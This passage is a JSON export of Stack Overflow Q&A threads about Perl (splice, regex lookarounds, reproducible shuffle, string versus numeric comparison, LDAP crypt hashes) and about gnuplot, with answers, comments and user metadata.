(@ORF) {   \n    if (length ($_) &lt;= 50) {\n            splice @ORF, ;\n}\n</code></pre>\n\n<p>I want to know what the second argument of splice should be, I have googled around but I cannot find a way to call an element as a numerical value.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "edited": false, "score": 2, "creation_date": 1447239409, "post_id": 33649042, "comment_id": 55071539, "body": "<code>s&#47;.*(?=myregex)&#47;&#47;;</code>"}, {"owner": {"reputation": 159902, "user_id": 3297613, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/KHhzd.jpg?s=128&g=1", "display_name": "Avinash Raj", "link": "https://stackoverflow.com/users/3297613/avinash-raj"}, "edited": false, "score": 1, "creation_date": 1447239449, "post_id": 33649042, "comment_id": 55071560, "body": "see <a href=\"https://regex101.com/r/yU1rE3/1\" rel=\"nofollow noreferrer\">regex101.com/r/yU1rE3/1</a>"}, {"owner": {"reputation": 547, "user_id": 3608859, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/141c2980f205ce9f018407974ae31bbf?s=128&d=identicon&r=PG&f=1", "display_name": "alabamajack", "link": "https://stackoverflow.com/users/3608859/alabamajack"}, "edited": false, "score": 0, "creation_date": 1447343339, "post_id": 33649042, "comment_id": 55123985, "body": "perfect answers :) thanks"}], "answers": [{"tags": [], "owner": {"reputation": 165, "user_id": 1585682, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/807f9e1a1aeea0d1dbb339f65fdaa753?s=128&d=identicon&r=PG&f=1", "display_name": "YMI", "link": "https://stackoverflow.com/users/1585682/ymi"}, "is_accepted": false, "score": -1, "last_activity_date": 1447280033, "creation_date": 1447280033, "answer_id": 33660856, "question_id": 33649042, "link": "https://stackoverflow.com/questions/33649042/find-all-signscharacters-whitespaces-digits-etc-before-regex/33660856#33660856", "title": "find ALL signs(characters, whitespaces, digits etc.) before regex", "body": "<p>The question is worded very badly. As I understand it, you want to remove everything before the part that matches your regular expression.</p>\n\n<p>If that's the case, this might help: <code>s/.*(&lt;REGEX&gt;)/\\1/g</code><br>\nThis matches all the characters before your regex (<code>.*</code>) and then matches your regex and creates a group. Once the matching is complete, it replaces all the matched section with the contents of the group alone (<code>\\1</code>).</p>\n"}], "owner": {"reputation": 547, "user_id": 3608859, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/141c2980f205ce9f018407974ae31bbf?s=128&d=identicon&r=PG&f=1", "display_name": "alabamajack", "link": "https://stackoverflow.com/users/3608859/alabamajack"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 71, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1447280033, "creation_date": 1447239217, "last_edit_date": 1495541037, "question_id": 33649042, "link": "https://stackoverflow.com/questions/33649042/find-all-signscharacters-whitespaces-digits-etc-before-regex", "title": "find ALL signs(characters, whitespaces, digits etc.) before regex", "body": "<p>I want to find(to remove this with perl, but this is not the question) all characters, digits, whitespaces before a special regex.</p>\n\n<p>Example:</p>\n\n<pre><code>this is my test\nfoo ... == &lt; foo\nsomething else\n\nmyregex\n all other\n</code></pre>\n\n<p>So I want to find</p>\n\n<pre><code>this is my test\nfoo ... == &lt; foo\nsomething else\n</code></pre>\n\n<p>its ok when </p>\n\n<pre><code>myregex\n</code></pre>\n\n<p>is also \"highlighted\".</p>\n\n<p>I found some other post <a href=\"https://stackoverflow.com/questions/7793950/regex-to-remove-all-text-before-a-character\">regex to remove all text before a character</a>, but this does not realy match my problem...</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 1569, "user_id": 1869172, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/z6EYX.png?s=128&g=1", "display_name": "yildizabdullah", "link": "https://stackoverflow.com/users/1869172/yildizabdullah"}, "edited": false, "score": 2, "creation_date": 1447237982, "post_id": 33648532, "comment_id": 55070749, "body": "I think calling srand() each time with the same seed value before running shuffle would be enough."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1447238541, "post_id": 33648532, "comment_id": 55071060, "body": "Surelty the whole point of a shuffle is to produce a random order?"}, {"owner": {"reputation": 1569, "user_id": 1869172, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/z6EYX.png?s=128&g=1", "display_name": "yildizabdullah", "link": "https://stackoverflow.com/users/1869172/yildizabdullah"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447238624, "post_id": 33648532, "comment_id": 55071107, "body": "I was running some tests and I needed to get the same results to make sure that my code works fine. That&#39;s why I need it."}, {"owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1447240449, "post_id": 33648532, "comment_id": 55072111, "body": "<a href=\"https://github.com/Scalar-List-Utils/Scalar-List-Utils/blob/master/ListUtil.xs#L916\" rel=\"nofollow noreferrer\">github.com/Scalar-List-Utils/Scalar-List-Utils/blob/master/&hellip;</a>"}], "answers": [{"tags": [], "owner": {"reputation": 7958, "user_id": 1069726, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/2cbbae354bb4f5f320b93ab3ad4b0fa1?s=128&d=identicon&r=PG", "display_name": "LeoNerd", "link": "https://stackoverflow.com/users/1069726/leonerd"}, "is_accepted": true, "score": 10, "last_activity_date": 1447256633, "last_edit_date": 1447256633, "creation_date": 1447250927, "answer_id": 33652308, "question_id": 33648532, "link": "https://stackoverflow.com/questions/33648532/how-to-make-listutil-shuffle-reproduce-same-output-in-perl/33652308#33652308", "title": "How to make List::Util &#39;shuffle&#39; reproduce same output in Perl", "body": "<p>Use the <code>srand()</code> function always with the same seed value (<code>123</code> in this case). E.g. I get:</p>\n\n<pre><code>$ perl -MList::Util=shuffle -E 'srand 123; say shuffle 1 .. 5'\n41352\n</code></pre>\n\n<p>repeatable every time. Without the <a href=\"http://perldoc.perl.org/functions/srand.html\" rel=\"noreferrer\">srand()</a> call it differs.</p>\n"}], "owner": {"reputation": 1569, "user_id": 1869172, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/z6EYX.png?s=128&g=1", "display_name": "yildizabdullah", "link": "https://stackoverflow.com/users/1869172/yildizabdullah"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 485, "favorite_count": 0, "accepted_answer_id": 33652308, "answer_count": 1, "score": 5, "last_activity_date": 1447256633, "creation_date": 1447237411, "question_id": 33648532, "link": "https://stackoverflow.com/questions/33648532/how-to-make-listutil-shuffle-reproduce-same-output-in-perl", "title": "How to make List::Util &#39;shuffle&#39; reproduce same output in Perl", "body": "<p>Can Perl's shuffle be utilized such that each time it produces the outputs in the same order?</p>\n"}, {"tags": ["arrays", "perl", "duplicates"], "comments": [{"owner": {"reputation": 1000, "user_id": 900564, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/UoHjG.jpg?s=128&g=1", "display_name": "Micha\u0142 Szkudlarek", "link": "https://stackoverflow.com/users/900564/micha%c5%82-szkudlarek"}, "edited": false, "score": 3, "creation_date": 1447236917, "post_id": 33648230, "comment_id": 55070139, "body": "Have you tried anything? If yes, please share it."}, {"owner": {"reputation": 57, "user_id": 3248103, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b8338af953d8d00eff5e55b324b67f09?s=128&d=identicon&r=PG&f=1", "display_name": "user3248103", "link": "https://stackoverflow.com/users/3248103/user3248103"}, "reply_to_user": {"reputation": 1000, "user_id": 900564, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/UoHjG.jpg?s=128&g=1", "display_name": "Micha\u0142 Szkudlarek", "link": "https://stackoverflow.com/users/900564/micha%c5%82-szkudlarek"}, "edited": false, "score": 0, "creation_date": 1447236948, "post_id": 33648230, "comment_id": 55070153, "body": "I tried @array = grep {!/^$element$/} @array;   But this is removing duplicate elements also"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1447238586, "post_id": 33648230, "comment_id": 55071083, "body": "<code>grep</code> <i>is</i> iterating in a loop. It&#39;s hiding that behind the scenes."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 2, "creation_date": 1447238880, "post_id": 33648230, "comment_id": 55071255, "body": "You need to give us a) sample inputs, b) expected outputs and (most importantly) c) your code. Without a and b we would only be guessing at what you mean. Without c, well, we&#39;d probably assume that you were lazy and wanted us to do your homework for you. And don&#39;t give us this information in comments - edit your question to add further details."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1447252137, "post_id": 33648230, "comment_id": 55078605, "body": "@user3248103 As a new user to the site, the correct response is: thank you, I will use that feedback to ask better questions in the future."}], "answers": [{"tags": [], "owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "is_accepted": true, "score": 2, "last_activity_date": 1447241296, "creation_date": 1447241296, "answer_id": 33649580, "question_id": 33648230, "link": "https://stackoverflow.com/questions/33648230/remove-original-element-from-an-array-without-removing-its-duplicates-in-perl/33649580#33649580", "title": "remove original element from an array without removing its duplicates in perl", "body": "<p>One loop to store elements in hash, and one grep to show remaining elements. All this assuming that <code>undef</code> is not occurring as value in your array of duplicates.</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Data::Dumper;\n\nmy @r = (1..8, 1..8);\n\nmy %ref;\npush @{ $ref{$_} }, \\$_ for @r;\n\nmy $to_remove = 2;\nundef ${shift @{ $ref{$to_remove} }};\nprint Dumper \\@r;\n\nundef ${shift @{ $ref{$to_remove} }};\nprint Dumper \\@r;\n\nprint Dumper [ grep defined, @r ];\n</code></pre>\n"}], "owner": {"reputation": 57, "user_id": 3248103, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b8338af953d8d00eff5e55b324b67f09?s=128&d=identicon&r=PG&f=1", "display_name": "user3248103", "link": "https://stackoverflow.com/users/3248103/user3248103"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "accepted_answer_id": 33649580, "answer_count": 1, "score": -4, "last_activity_date": 1447241296, "creation_date": 1447236313, "question_id": 33648230, "link": "https://stackoverflow.com/questions/33648230/remove-original-element-from-an-array-without-removing-its-duplicates-in-perl", "title": "remove original element from an array without removing its duplicates in perl", "body": "<p>I have an array with duplicate elements. I would like to remove one element at a time without iterating in a loop. Also, if I remove an element, if any duplicate element exists for that element it should remain in the array. Is there any way to do this in perl?</p>\n"}, {"tags": ["python", "perl", "graphics", "plot", "gnuplot"], "answers": [{"comments": [{"owner": {"reputation": 309, "user_id": 2438436, "user_type": "registered", "accept_rate": 35, "profile_image": "https://i.stack.imgur.com/t4R0Q.jpg?s=128&g=1", "display_name": "Diego Calzadilla", "link": "https://stackoverflow.com/users/2438436/diego-calzadilla"}, "edited": false, "score": 0, "creation_date": 1447305228, "post_id": 33644880, "comment_id": 55103001, "body": "Thanks a lot, it helped!!"}], "tags": [], "owner": {"reputation": 960, "user_id": 2323274, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b62fedfdf7661b3ba3621ede1265ede0?s=128&d=identicon&r=PG", "display_name": "Azad", "link": "https://stackoverflow.com/users/2323274/azad"}, "is_accepted": true, "score": 2, "last_activity_date": 1447220518, "creation_date": 1447220518, "answer_id": 33644880, "question_id": 33644745, "link": "https://stackoverflow.com/questions/33644745/plot-multiple-graphs-from-multiple-files-gnuplot/33644880#33644880", "title": "plot multiple graphs from multiple files gnuplot", "body": "<pre><code>index = \"1-1 2-1 4-1 8-1 16-1 32-1 1-2 2-2 4-2 8-2\"\ndo for [i in index] {\n    set output \"qd-dPZ-z\".i.\"nn.ps\"\n    plot \"qd-dPZ-z\".i.\"nn.ps\" using 1:2 with lines\n}\n</code></pre>\n"}], "owner": {"reputation": 309, "user_id": 2438436, "user_type": "registered", "accept_rate": 35, "profile_image": "https://i.stack.imgur.com/t4R0Q.jpg?s=128&g=1", "display_name": "Diego Calzadilla", "link": "https://stackoverflow.com/users/2438436/diego-calzadilla"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 246, "favorite_count": 1, "accepted_answer_id": 33644880, "answer_count": 1, "score": 0, "last_activity_date": 1447220518, "creation_date": 1447219564, "question_id": 33644745, "link": "https://stackoverflow.com/questions/33644745/plot-multiple-graphs-from-multiple-files-gnuplot", "title": "plot multiple graphs from multiple files gnuplot", "body": "<p>I have a set of files named like this:</p>\n\n<pre><code>qd-dPZ-z1-1nn.dat \nqd-dPZ-z2-1nn.dat \nqd-dPZ-z4-1nn.dat \nqd-dPZ-z8-1nn.dat \nqd-dPZ-z16-1nn.dat \nqd-dPZ-z32-1nn.dat \nqd-dPZ-z1-2nn.dat \nqd-dPZ-z2-2nn.dat \nqd-dPZ-z4-2nn.dat \nqd-dPZ-z8-2nn.dat\n</code></pre>\n\n<p>I need to generate a graph for each file (from file </p>\n\n<pre><code>qd-dPZ-z1-1nn.dat \n</code></pre>\n\n<p>generate graph</p>\n\n<pre><code>qd-dPZ-z1-1nn.ps \n</code></pre>\n\n<p>from file </p>\n\n<pre><code>qd-dPZ-z2-1nn.dat \n</code></pre>\n\n<p>generate graph </p>\n\n<pre><code>qd-dPZ-z2-1nn.ps \n</code></pre>\n\n<p>and so on) </p>\n\n<p>So far, I\u00b4ve tried </p>\n\n<pre><code>gnuplot&gt; filenames = \"qd-dPZ-z1-1nn.dat qd-dPZ-z2-1nn.dat qd-dPZ-z4-1nn.dat qd-dPZ-z8-1nn.dat qd-dPZ-z16-1nn.dat qd-dPZ-z32-1nn.dat qd-dPZ-z1-2nn.dat qd-dPZ-z2-2nn.dat qd-dPZ-z4-2nn.dat qd-dPZ-z8-2nn.dat qd-dPZ-z16-2nn.dat qd-dPZ-z32-2nn.dat qd-dPZ-z1-4nn.dat\" \ngnuplot&gt; plot for [file in filenames] file using 1:2 with lines\n</code></pre>\n\n<p>But this plots all my files in a single graph.</p>\n\n<p>Is there a way to generate separeted graphs from each file?</p>\n"}, {"tags": ["regex", "string", "perl"], "comments": [{"owner": {"reputation": 6639, "user_id": 1157100, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/1f9W9.png?s=128&g=1", "display_name": "200_success", "link": "https://stackoverflow.com/users/1157100/200-success"}, "edited": false, "score": 0, "creation_date": 1447195583, "post_id": 33640782, "comment_id": 55056246, "body": "Do you want to locate text that is sandwiched between non-alphabetic characters? Or do you want to match a pattern but excluding alphabetic characters? The two tests are not the same at the beginning or end of the string."}, {"owner": {"reputation": 911, "user_id": 2943867, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4909e6e084f25d04966cd04ce8b3b15f?s=128&d=identicon&r=PG&f=1", "display_name": "Timestretch", "link": "https://stackoverflow.com/users/2943867/timestretch"}, "reply_to_user": {"reputation": 6639, "user_id": 1157100, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/1f9W9.png?s=128&g=1", "display_name": "200_success", "link": "https://stackoverflow.com/users/1157100/200-success"}, "edited": false, "score": 0, "creation_date": 1447198883, "post_id": 33640782, "comment_id": 55057599, "body": "My intent was to do the first of the two.  Both sln&#39;s and hjpotter92&#39;s answers accomplish this, not sure about ergonaut&#39;s."}, {"owner": {"reputation": 7570, "user_id": 17945, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/e8cbc0b9ed29b027a127d8df309af5a6?s=128&d=identicon&r=PG", "display_name": "reinierpost", "link": "https://stackoverflow.com/users/17945/reinierpost"}, "edited": false, "score": 0, "creation_date": 1447232774, "post_id": 33640782, "comment_id": 55067887, "body": "Also have a look at <a href=\"http://perldoc.perl.org/perlre.html#Assertions\" rel=\"nofollow noreferrer\">\\b</a>."}], "answers": [{"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 3, "creation_date": 1447195224, "post_id": 33640869, "comment_id": 55056080, "body": "Although using <code>\\1</code> and <code>\\2</code> on the RHS of a substitution works, <a href=\"http://perldoc.perl.org/perlre.html#Warning-on-%5C1-Instead-of-%241\" rel=\"nofollow noreferrer\"><code>perldoc perlre</code></a> calls it &quot;a dirty habit to get into.&quot; You should use <code>$1</code> and <code>$2</code> instead."}], "tags": [], "owner": {"reputation": 71156, "user_id": 1190388, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/5391819cc4abe0cb43587c9ef1808dbd?s=128&d=identicon&r=PG", "display_name": "hjpotter92", "link": "https://stackoverflow.com/users/1190388/hjpotter92"}, "is_accepted": false, "score": 3, "last_activity_date": 1447194478, "creation_date": 1447194478, "answer_id": 33640869, "question_id": 33640782, "link": "https://stackoverflow.com/questions/33640782/perl-string-replace-match-but-not-replace-part-of-regex/33640869#33640869", "title": "Perl string replace: Match, but not replace, part of regex", "body": "<p>Store them as a matched group, and reference them in the replacement string:</p>\n\n<pre><code>$string =~ s/([^a-z])$find([^A-Z])/\\1$replace\\2/gi;\n</code></pre>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user557597"}, "is_accepted": true, "score": 3, "last_activity_date": 1447194969, "last_edit_date": 1447194969, "creation_date": 1447194820, "answer_id": 33640941, "question_id": 33640782, "link": "https://stackoverflow.com/questions/33640782/perl-string-replace-match-but-not-replace-part-of-regex/33640941#33640941", "title": "Perl string replace: Match, but not replace, part of regex", "body": "<p>Use <a href=\"http://perldoc.perl.org/perlre.html#Look-Around-Assertions\" rel=\"nofollow\">look-around assertions</a>.</p>\n\n<pre><code>s/(?&lt;=[^a-zA-Z])$find(?=[^a-zA-Z])/$replace/g\n</code></pre>\n"}], "owner": {"reputation": 911, "user_id": 2943867, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4909e6e084f25d04966cd04ce8b3b15f?s=128&d=identicon&r=PG&f=1", "display_name": "Timestretch", "link": "https://stackoverflow.com/users/2943867/timestretch"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 994, "favorite_count": 0, "accepted_answer_id": 33640941, "answer_count": 2, "score": 2, "last_activity_date": 1447194969, "creation_date": 1447194062, "question_id": 33640782, "link": "https://stackoverflow.com/questions/33640782/perl-string-replace-match-but-not-replace-part-of-regex", "title": "Perl string replace: Match, but not replace, part of regex", "body": "<p>Say I have a string in Perl I am trying to match and replace with stuff: </p>\n\n<pre><code>$string =~ s/[^a-zA-Z]$find[^a-zA-Z]/$replace/g;\n</code></pre>\n\n<p>So as shown, I want to replace everything that is surrounded on both sides by nonletter characters.  However, when I replace the string, I do NOT want to also replace these characters: they are just necessary for correct matching.  How can I tell the Perl regex to avoid replacing the things surrounding <code>$find</code>?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 38484, "user_id": 121332, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/3f0d8a55b2dacb482fe57b31ea260173?s=128&d=identicon&r=PG", "display_name": "Alex Brown", "link": "https://stackoverflow.com/users/121332/alex-brown"}, "edited": false, "score": 1, "creation_date": 1447190608, "post_id": 33639721, "comment_id": 55053727, "body": "edited title, since &#39;the expected results&#39; is only your expectation, which was wrong."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 2, "creation_date": 1447190887, "post_id": 33639721, "comment_id": 55053886, "body": "You might be confused by the <code>test</code> command (used in shell scripts as <code>[</code> ... <code>]</code>), which uses <code>-gt</code> and <code>-lt</code> for numeric comparisons."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447193410, "post_id": 33639721, "comment_id": 55055211, "body": "It&#39;s also bad new to use <code>$a</code>. Aside from single character variable names just being bad in general, it&#39;s also got a specific meaning in <code>perl</code> - it&#39;s used for <code>sort</code>."}], "answers": [{"comments": [{"owner": {"reputation": 7958, "user_id": 1069726, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/2cbbae354bb4f5f320b93ab3ad4b0fa1?s=128&d=identicon&r=PG", "display_name": "LeoNerd", "link": "https://stackoverflow.com/users/1069726/leonerd"}, "edited": false, "score": 1, "creation_date": 1447251069, "post_id": 33639738, "comment_id": 55077879, "body": "An easy way to remember it is that all the operators whose names are spelled in letters (<code>eq</code>, <code>lt</code>, <code>cmp</code> etc...) operate on strings, while the operators whose names look like maths symbols (<code>==</code>, <code>&lt;</code>, <code>&lt;=&gt;</code>, etc...) operate on numbers."}], "tags": [], "owner": {"reputation": 29236, "user_id": 4727, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01a99498921b93509c73d390704bddf6?s=128&d=identicon&r=PG", "display_name": "Leon Timmermans", "link": "https://stackoverflow.com/users/4727/leon-timmermans"}, "is_accepted": false, "score": 12, "last_activity_date": 1447190001, "creation_date": 1447190001, "answer_id": 33639738, "question_id": 33639721, "link": "https://stackoverflow.com/questions/33639721/why-do-lt-and-gt-in-perl-not-work-for-comparing-real-numbers/33639738#33639738", "title": "Why do lt and gt in Perl not work for comparing real numbers?", "body": "<p><code>lt</code> and <code>gt</code> are string operators, with numbers you want to use plain old <code>&lt;</code> and <code>&gt;</code>. Perl is polymorphic on values, so it's monomorphic on operators (unlike for example python which is the other way around).</p>\n"}, {"tags": [], "owner": {"reputation": 7801, "user_id": 1212401, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ed478436fcb05fd3ae15da650d2a8cd6?s=128&d=identicon&r=PG", "display_name": "Chris Doyle", "link": "https://stackoverflow.com/users/1212401/chris-doyle"}, "is_accepted": false, "score": 6, "last_activity_date": 1447190473, "creation_date": 1447190473, "answer_id": 33639858, "question_id": 33639721, "link": "https://stackoverflow.com/questions/33639721/why-do-lt-and-gt-in-perl-not-work-for-comparing-real-numbers/33639858#33639858", "title": "Why do lt and gt in Perl not work for comparing real numbers?", "body": "<p>In perl the <code>lt</code> and <code>gt</code> operators are not the same as the <code>&lt;</code> and <code>&gt;</code>. the perl documentation details this here <a href=\"http://perldoc.perl.org/perlop.html\">perlop</a> under rational operators, below is extracted from the documentation:</p>\n\n<pre><code>Binary \"&lt;\" returns true if the left argument is numerically less than the right argument.\nBinary \"&gt;\" returns true if the left argument is numerically greater than the right argument.\nBinary \"&lt;=\" returns true if the left argument is numerically less than or equal to the right argument.\nBinary \"&gt;=\" returns true if the left argument is numerically greater than or equal to the right argument.\nBinary \"lt\" returns true if the left argument is stringwise less than the right argument.\nBinary \"gt\" returns true if the left argument is stringwise greater than the right argument.\nBinary \"le\" returns true if the left argument is stringwise less than or equal to the right argument.\nBinary \"ge\" returns true if the left argument is stringwise greater than or equal to the right argument.\n</code></pre>\n\n<p>Since perl does not have a string object and integer object perl has to make a guess at the context of the object. The only way perl can know if you you are comparing a string or an integer is by ensuring that the rational operators for <code>lt</code> and <code>gt</code> force the context for comparisons as a sting and that <code>&lt;</code> and <code>&gt;</code> operators for the context for comparisons as integers</p>\n"}], "owner": {"reputation": 1213, "user_id": 3263864, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/41c98358d847c68ff3b45bffc099d98f?s=128&d=identicon&r=PG&f=1", "display_name": "DeepDeadpool", "link": "https://stackoverflow.com/users/3263864/deepdeadpool"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1320, "favorite_count": 0, "answer_count": 2, "score": 5, "last_activity_date": 1447190585, "creation_date": 1447189940, "last_edit_date": 1447190585, "question_id": 33639721, "link": "https://stackoverflow.com/questions/33639721/why-do-lt-and-gt-in-perl-not-work-for-comparing-real-numbers", "title": "Why do lt and gt in Perl not work for comparing real numbers?", "body": "<p>Lets examine the following perl code</p>\n\n<pre><code>if ($a lt 0.00 or $a gt 100.000)\n{\n    print \"a must be between 0 and 100 \\n\";\n    exit 1\n}\nexit 0\n</code></pre>\n\n<p>Lets say a equals 5. The above code will exit with failure status because a isn't between 0 and 100.</p>\n\n<p>Simply replacing the <code>lt</code> and <code>gt</code> with the actual operators they represent, <code>&lt;</code> and <code>&gt;</code> respectively, yields the expected results. Replacing the 100 with a number starting with a 9 will also yield the expected result.</p>\n\n<p>Why are Perl's comparison operators telling me 5 is not between 0 and 100?</p>\n"}, {"tags": ["perl", "ldap", "decode", "crypt"], "answers": [{"tags": [], "owner": {"reputation": 8993, "user_id": 1354537, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/24aaaba3c6140eaef24f9ed711644033?s=128&d=identicon&r=PG", "display_name": "Marged", "link": "https://stackoverflow.com/users/1354537/marged"}, "is_accepted": false, "score": 0, "last_activity_date": 1447194616, "last_edit_date": 1447194616, "creation_date": 1447189756, "answer_id": 33639671, "question_id": 33639613, "link": "https://stackoverflow.com/questions/33639613/how-to-decode-a-ldap-crypt-password/33639671#33639671", "title": "How to decode a LDAP {crypt} password", "body": "<p>If implemented correctly a password stored as <code>crypt</code> can not be decoded into cleartext because it is not encrypted but hashed.</p>\n\n<p>Depending on your target system you might be able to migrate the hashed passwords \"as-is\", but you have to determine which hash was used and if the same is supported by your target system.</p>\n\n<p>You need to disclose more about the LDAP server and the database you use.</p>\n"}, {"tags": [], "owner": {"reputation": 29236, "user_id": 4727, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01a99498921b93509c73d390704bddf6?s=128&d=identicon&r=PG", "display_name": "Leon Timmermans", "link": "https://stackoverflow.com/users/4727/leon-timmermans"}, "is_accepted": false, "score": 1, "last_activity_date": 1447189894, "last_edit_date": 1490005774, "creation_date": 1447189894, "answer_id": 33639709, "question_id": 33639613, "link": "https://stackoverflow.com/questions/33639613/how-to-decode-a-ldap-crypt-password/33639709#33639709", "title": "How to decode a LDAP {crypt} password", "body": "<p>The answer should be <em>no</em>. The whole point of hashes such as crypt is that you can't do that. However, if it's using the old-fashion unix <code>crypt()</code>, it's often actually quite brute-forceable (it's rather weak cryptography). Question is, should you really want that.</p>\n\n<p>This is sounding like an <a href=\"https://meta.stackexchange.com/questions/66377/what-is-the-xy-problem\">XY problem</a> though. What LDAP servers are we talking about, and what formats do they support? There's a reasonable chance there's some kind of overlap that can be used for migrational purposes.</p>\n"}, {"tags": [], "owner": {"reputation": 717, "user_id": 1483288, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/5b0b7a55223dba7a538aaf97dbbc6150?s=128&d=identicon&r=PG", "display_name": "ccc31807", "link": "https://stackoverflow.com/users/1483288/ccc31807"}, "is_accepted": true, "score": 3, "last_activity_date": 1447189941, "creation_date": 1447189941, "answer_id": 33639723, "question_id": 33639613, "link": "https://stackoverflow.com/questions/33639613/how-to-decode-a-ldap-crypt-password/33639723#33639723", "title": "How to decode a LDAP {crypt} password", "body": "<p>No, crypt implements a one way hash.</p>\n\n<p>However, you have the hash values and (hopefully) the salt. Whenever a user submits a password, it's encrypted with the same salt, and if the hashes match, the user is authenticated.</p>\n\n<p>In general, it's a very bad practice to have human readable passwords, but you don't need to read a raw input password to authenticate a user.</p>\n"}], "owner": {"reputation": 536, "user_id": 2474584, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e6e418c16310ba0f1ebee40f3b42c6af?s=128&d=identicon&r=PG", "display_name": "tubadc", "link": "https://stackoverflow.com/users/2474584/tubadc"}, "delete_vote_count": 0, 